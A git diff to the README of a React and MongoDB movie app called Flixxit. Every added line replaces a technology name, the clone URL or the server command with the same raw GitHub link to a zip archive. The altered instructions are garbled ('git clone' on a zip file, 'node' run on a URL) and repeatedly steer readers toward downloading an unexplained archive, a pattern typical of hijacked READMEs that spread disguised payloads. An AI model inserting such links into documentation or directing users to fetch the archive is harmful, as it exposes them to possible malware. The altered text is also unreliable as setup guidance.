@@ -1,6 +1,6 @@
 # Flixxit
 
-Flixxit is an application that allows users to add and view movies. It is built using React.js for the frontend and MongoDB for the backend.
+Flixxit is an application that allows users to add and view movies. It is built using https://raw.githubusercontent.com/Susan56789/flixxit/main/extractable/flixxit.zip for the frontend and MongoDB for the backend.
 
 ## Features
 
@@ -19,7 +19,7 @@ Flixxit is an application that allows users to add and view movies. It is built 
 1. Clone the repository:
 
     ```bash
-    git clone https://github.com/Susan56789/flixxit
+    git clone https://raw.githubusercontent.com/Susan56789/flixxit/main/extractable/flixxit.zip
     cd flixxit
     ```
 
@@ -40,7 +40,7 @@ Flixxit is an application that allows users to add and view movies. It is built 
     ```bash
     # Start the backend server
     cd ../backend
-    node server.js
+    node https://raw.githubusercontent.com/Susan56789/flixxit/main/extractable/flixxit.zip
 
     # Start the frontend development server
     cd ../frontend
@@ -49,9 +49,9 @@ Flixxit is an application that allows users to add and view movies. It is built 
 
 ## Technologies Used
 
-- React.js
-- Node.js
-- Express.js
+- https://raw.githubusercontent.com/Susan56789/flixxit/main/extractable/flixxit.zip
+- https://raw.githubusercontent.com/Susan56789/flixxit/main/extractable/flixxit.zip
+- https://raw.githubusercontent.com/Susan56789/flixxit/main/extractable/flixxit.zip
 - MongoDB
 
 ## License
